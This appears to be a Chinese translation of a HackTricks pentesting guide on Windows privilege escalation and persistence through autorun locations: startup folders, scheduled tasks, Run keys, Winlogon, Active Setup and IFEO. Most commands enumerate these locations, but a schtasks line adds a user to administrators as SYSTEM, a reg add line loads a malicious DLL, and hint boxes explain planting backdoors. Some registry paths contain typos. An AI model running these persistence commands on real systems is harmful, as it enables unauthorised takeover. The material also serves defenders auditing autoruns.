# 使用Autoruns进行权限提升

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果你对**黑客职业**感兴趣并且想要攻破不可攻破的系统——我们正在招聘！（需要流利的波兰语书写和口语能力）。

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic**可以用来在**启动时**运行程序。使用以下命令查看在启动时运行的二进制文件：
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## 定时任务

**任务**可以按照**特定频率**进行调度运行。使用以下命令查看已安排运行的二进制文件：
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## 文件夹

所有位于**启动文件夹中的二进制文件将在启动时执行**。常见的启动文件夹如下所示，但启动文件夹在注册表中指定。[阅读此处了解具体位置。](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## 注册表

{% hint style="info" %}
注意：**Wow6432Node** 注册表项表示您正在运行的是 64 位 Windows 版本。操作系统使用此键为在 64 位 Windows 版本上运行的 32 位应用程序显示 HKEY\_LOCAL\_MACHINE\SOFTWARE 的单独视图。
{% endhint %}

### 运行

**常见的** AutoRun 注册表：

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Run 和 RunOnce 注册表键会导致程序在每次用户登录时运行。键的数据值是一条不超过 260 个字符的命令行。

**服务运行**（可以控制启动时服务的自动启动）：

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

在 Windows Vista 和更新版本中，默认不会创建此项。注册表运行键条目可以直接引用程序，也可以将其列为依赖项。例如，可以使用 RunOnceEx 的 "Depend" 键在登录时加载 DLL：`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"`

{% hint style="info" %}
**Exploit 1**：如果您可以在 **HKLM** 中的任何提到的注册表中写入内容，则可以在其他用户登录时提升权限。
{% endhint %}

{% hint style="info" %}
**Exploit 2**：如果您可以覆盖任何在 **HKLM** 中指定的二进制文件，则可以在其他用户登录时修改该二进制文件并提升权限。
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### 启动路径

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

任何创建到启动子键所指向位置的快捷方式都会在登录/重启时启动服务。启动位置在本地计算机和当前用户中都有指定。

{% hint style="info" %}
如果你能覆盖掉 **HKLM** 下的任何\[User] Shell Folder，你就可以将其指向一个由你控制的文件夹，并放置一个后门，这样每当用户登录系统时，特权就会被提升并执行后门。
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon键

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

通常，**Userinit**键指向userinit.exe，但如果该键被更改，那么该exe也将由Winlogon启动。\
**Shell**键应指向explorer.exe。
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
如果您可以覆盖注册表值或二进制文件，您将能够提升权限。
{% endhint %}

### 策略设置

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

检查 **Run** 键。
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

路径：**`HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`**

在注册表键`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot`下，有一个名为**AlternateShell**的值，默认设置为`cmd.exe`（命令提示符）。当您在启动过程中按下F8并选择“带命令提示符的安全模式”时，系统将使用此替代shell。\
但是，您可以创建一个启动选项，这样您就不必按F8，然后选择“带命令提示符的安全模式”。

1. 编辑boot.ini（c:\boot.ini）文件的属性，使文件变为非只读、非系统和非隐藏（attrib c:\boot.ini -r -s -h）。
2. 打开boot.ini。
3. 添加类似以下的一行：`multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. 保存文件。
5. 重新应用正确的权限（attrib c:\boot.ini +r +s +h）。

来自[这里](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)的信息。

{% hint style="info" %}
**Exploit 1：**如果您可以修改此注册表键，您可以将您的后门指向它。
{% endhint %}

{% hint style="info" %}
**Exploit 2（PATH写权限）：**如果您对系统**PATH**中_C:\Windows\system32_之前的任何文件夹具有写权限（或者如果您可以更改它），您可以创建一个cmd.exe文件，如果有人在安全模式下启动机器，您的后门将被执行。
{% endhint %}

{% hint style="info" %}
**Exploit 3（PATH写权限和boot.ini写权限）：**如果您可以写入boot.ini，您可以自动启动下一次重启时的安全模式。
{% endhint %}
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### 已安装组件

* `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Active Setup在桌面出现之前运行。由Active Setup启动的命令是同步运行的，它们在执行时会阻塞登录。Active Setup在评估任何Run或RunOnce注册表项之前执行。

在这些键中，您将找到更多的键，每个键都包含一些有趣的键值。最有趣的是：

* **IsInstalled:**
* 0：组件的命令将不会运行。
* 1：组件的命令将每个用户运行一次。这是默认值（如果IsInstalled值不存在）。
* **StubPath**
* 格式：任何有效的命令行，例如“notepad”
* 如果Active Setup确定需要在登录期间运行此组件，则执行此命令。

{% hint style="info" %}
如果您可以在具有 _**IsInstalled == "1"**_ 和 **StubPath** 键的任何键上进行写入/覆盖，您可以将其指向一个后门并提升权限。此外，如果您可以覆盖任何 **StubPath** 键指向的任何 **二进制文件**，您也可以提升权限。
{% endhint %}
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### 浏览器辅助对象

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

**浏览器辅助对象**（**BHO**）是一个设计为微软的Internet Explorer网络浏览器提供附加功能的DLL模块插件。这些模块会在每个新的Internet Explorer实例和每个新的Windows Explorer实例中执行。然而，可以通过将键**NoExplorer**设置为1来防止每个实例中执行BHO。

截至Windows 10，BHO仍然在Internet Explorer 11中得到支持，但在默认的网络浏览器Microsoft Edge中不支持BHO。
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
请注意，注册表中将包含每个dll的1个新注册表项，并由**CLSID**表示。您可以在`HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`中找到CLSID信息。

### Internet Explorer扩展

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

请注意，注册表中将包含每个dll的1个新注册表项，并由**CLSID**表示。您可以在`HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`中找到CLSID信息。

### 字体驱动程序

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### 打开命令

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### 图像文件执行选项

The Image File Execution Options (IFEO) is a Windows feature that allows developers to debug and monitor applications. However, it can also be abused by attackers to escalate privileges on a local system.

图像文件执行选项（IFEO）是Windows的一个功能，允许开发人员调试和监视应用程序。然而，攻击者也可以滥用它来提升本地系统的权限。

When a program is launched, the operating system checks if there are any IFEO entries for that program in the Windows Registry. If an IFEO entry exists, the specified debugger is launched instead of the original program. This can be used to execute arbitrary code with elevated privileges.

当一个程序被启动时，操作系统会检查Windows注册表中是否存在该程序的任何IFEO条目。如果存在IFEO条目，则会启动指定的调试器而不是原始程序。这可以用来以提升的权限执行任意代码。

To escalate privileges using IFEO, an attacker can create a new IFEO entry for a system utility or a trusted application that runs with higher privileges. The attacker can specify their own malicious binary as the debugger, which will be executed with elevated privileges whenever the targeted program is launched.

要利用IFEO提升权限，攻击者可以为系统实用程序或以较高权限运行的受信任应用程序创建一个新的IFEO条目。攻击者可以将自己的恶意二进制文件指定为调试器，每当目标程序启动时，该恶意二进制文件都会以提升的权限执行。

This technique can be used to bypass security measures that rely on the integrity of system utilities or trusted applications. By executing arbitrary code with elevated privileges, an attacker can gain full control over the compromised system.

这种技术可以用来绕过依赖于系统实用程序或受信任应用程序完整性的安全措施。通过以提升的权限执行任意代码，攻击者可以完全控制被攻击系统。
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

请注意，您可以找到自动运行的所有站点都已经被**winpeas.exe**搜索过了。但是，为了获得更全面的自动执行文件列表，您可以使用[systinternals的autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)：
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## 更多

在[https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)中查找更多类似注册表的Autoruns。

## 参考资料

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

如果您对**黑客职业**感兴趣并想要攻破不可攻破的系统 - **我们正在招聘！**（需要流利的波兰语书面和口语表达能力）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
